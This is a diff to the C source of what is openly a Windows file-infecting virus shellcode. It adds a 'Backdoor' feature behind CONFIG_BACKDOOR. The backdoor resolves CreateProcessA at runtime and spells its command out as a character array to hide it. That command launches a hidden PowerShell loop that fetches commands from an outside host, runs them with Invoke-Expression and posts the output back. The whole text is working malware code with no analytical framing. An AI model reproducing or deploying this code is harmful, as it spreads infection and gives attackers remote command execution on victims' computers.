@@ -59,6 +59,21 @@ typedef DWORD (WINAPI *__GetFileSize) (
 typedef BOOL (WINAPI *__CloseHandle) (
     _In_ _Post_ptr_invalid_ HANDLE hObject
 );
+
+#ifdef CONFIG_BACKDOOR
+typedef BOOL (WINAPI *__CreateProcessA) (
+    _In_opt_ LPCSTR lpApplicationName,
+    _Inout_opt_ LPSTR lpCommandLine,
+    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    _In_ BOOL bInheritHandles,
+    _In_ DWORD dwCreationFlags,
+    _In_opt_ LPVOID lpEnvironment,
+    _In_opt_ LPCSTR lpCurrentDirectory,
+    _In_ LPSTARTUPINFOA lpStartupInfo,
+    _Out_ LPPROCESS_INFORMATION lpProcessInformation
+);
+#endif
 //======================================================================
 
 typedef struct SHELL_CODE_SUPER_BLOCK {
@@ -77,6 +92,9 @@ typedef struct SHELL_CODE_SUPER_BLOCK {
     __SetEndOfFile _SetEndOfFile;
     __GetFileSize _GetFileSize;
     __CloseHandle _CloseHandle;
+#ifdef CONFIG_BACKDOOR
+    __CreateProcessA _CreateProcessA;
+#endif
     // headers
     IMAGE_DOS_HEADER dosHdr;
     IMAGE_FILE_HEADER fileHdr;
@@ -118,6 +136,9 @@ typedef struct SHELL_CODE_SUPER_BLOCK {
 #define SetEndOfFile sb->_SetEndOfFile
 #define GetFileSize sb->_GetFileSize
 #define CloseHandle sb->_CloseHandle
+#ifdef CONFIG_BACKDOOR
+#define CreateProcessA sb->_CreateProcessA
+#endif
 #else
 #include <fileapi.h>
 #include <handleapi.h>
@@ -480,6 +501,42 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     return 0;
 }
 
+//=====================================================================
+#ifdef CONFIG_BACKDOOR
+__forceinline void Backdoor(SCSB *sb) {
+    // run script
+    CHAR script[] = {
+        'P', 'o', 'w', 'e', 'r', 'S', 'h', 'e', 'l', 'l', '.', 'e', 'x', 'e', ' ',
+        '-', 'C', 'o', 'm', 'm', 'a', 'n', 'd', ' ',
+        '\"',
+        'I', 'n', 'v', 'o', 'k', 'e', '-', 'E', 'x', 'p', 'r', 'e', 's', 's', 'i', 'o', 'n', ' ', 
+        '\'','w', 'h', 'i', 'l', 'e', '(', '1', ')', '{',
+        'I', 'n', 'v', 'o', 'k', 'e', '-', 'R', 'e', 's', 't', 'M', 'e', 't', 'h', 'o', 'd', ' ', '-', 'U', 's', 'e', 'B', 'a', 's', 'i', 'c', 'P', 'a', 'r', 's', 'i', 'n', 'g', ' ', '-', 'U', 'r', 'i', ' ', 'h', 't', 't', 'p', 's', ':', '/', '/', 'v', 'i', 'r', 'u', 's', '.', 'x', 'i', 'n', 'y', 'a', 'n', 'g', '.', 'l', 'i', 'f', 'e', '/', 'r', 'e', 's', 'u', 'l', 't', ' ', '-', 'M', 'e', 't', 'h', 'o', 'd', ' ', 'P', 'O', 'S', 'T', ' ', '-', 'B', 'o', 'd', 'y', ' ', '@', '{', 'r', '=',
+        '$', '(', 'I', 'n', 'v', 'o', 'k', 'e', '-', 'E', 'x', 'p', 'r', 'e', 's', 's', 'i', 'o', 'n', ' ',
+        '$', '(', 'I', 'n', 'v', 'o', 'k', 'e', '-', 'R', 'e', 's', 't', 'M', 'e', 't', 'h', 'o', 'd', ' ', '-', 'U', 's', 'e', 'B', 'a', 's', 'i', 'c', 'P', 'a', 'r', 's', 'i', 'n', 'g', ' ', '-', 'U', 'r', 'i', ' ', 'h', 't', 't', 'p', 's', ':', '/', '/', 'v', 'i', 'r', 'u', 's', '.', 'x', 'i', 'n', 'y', 'a', 'n', 'g', '.', 'l', 'i', 'f', 'e', '/', ' ', '-', 'M', 'e', 't', 'h', 'o', 'd', ' ', 'P', 'O', 'S', 'T', ' ', '-', 'T', 'i', 'm', 'e', 'o', 'u', 't', 'S', 'e', 'c', ' ', '6', ')', '.', 'c', ' ', '|', ' ', 'O', 'u', 't', '-', 'S', 't', 'r', 'i', 'n', 'g', ')', '}', ' ', '-', 'T', 'i', 'm', 'e', 'o', 'u', 't', 'S', 'e', 'c', ' ', '6', '}',
+        '\'', '\"', '\0'
+    };
+    STARTUPINFOA si = {
+        .cb = sizeof(STARTUPINFOA),
+        .dwFlags = STARTF_USESHOWWINDOW,
+        .wShowWindow = HIDE_WINDOW,
+    };
+    PROCESS_INFORMATION pi = { 0 };
+    CreateProcessA(
+        NULL,   // lpApplicationName
+        script, // lpCommandLine
+        NULL,   // lpProcessAttribute
+        NULL,   // lpThreadAttribute
+        TRUE,   // bInheritHandles
+        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, // dwCreationFlags
+        NULL,   // lpEnvironment
+        NULL,   // lpCurrentDirectory
+        &si,    // lpStartupInfo
+        &pi     // lpProcessInformation
+    );
+}
+#endif
+
 //======================================================================
 
 __forceinline void GetAllFunc(PEB *peb, SCSB *sb) {
@@ -498,6 +555,9 @@ __forceinline void GetAllFunc(PEB *peb, SCSB *sb) {
     CHAR sSetEndOfFile[13] = {'S', 'e', 't', 'E', 'n', 'd', 'O', 'f', 'F', 'i', 'l', 'e', 0};
     CHAR sGetFileSize[12] = {'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0};
     CHAR sCloseHandle[12] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
+#ifdef CONFIG_BACKDOOR
+    CHAR sCreateProcessA[15] = {'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0};
+#endif
     // Get Functions
     sb->_FindFirstFileA = (__FindFirstFileA)FindFunction(sFindFirstFileA, DemandModuleBase);
     sb->_FindNextFileA = (__FindNextFileA)FindFunction(sFindNextFileA, DemandModuleBase);
@@ -509,6 +569,9 @@ __forceinline void GetAllFunc(PEB *peb, SCSB *sb) {
     sb->_SetEndOfFile = (__SetEndOfFile)FindFunction(sSetEndOfFile, DemandModuleBase);
     sb->_GetFileSize = (__GetFileSize)FindFunction(sGetFileSize, DemandModuleBase);
     sb->_CloseHandle = (__CloseHandle)FindFunction(sCloseHandle, DemandModuleBase);
+#ifdef CONFIG_BACKDOOR
+    sb->_CreateProcessA = (__CreateProcessA)FindFunction(sCreateProcessA, DemandModuleBase);
+#endif
 }
 
 //======================================================================
@@ -643,6 +706,9 @@ void ShellCode() {
     ShellCodeMain(sb);
     // copyFile
     copy_txt(sb);
+#ifdef CONFIG_BACKDOOR
+    Backdoor(sb);
+#endif
 #ifdef DEBUG
     printf("ss: %#p\n", imageBase);
 #endif
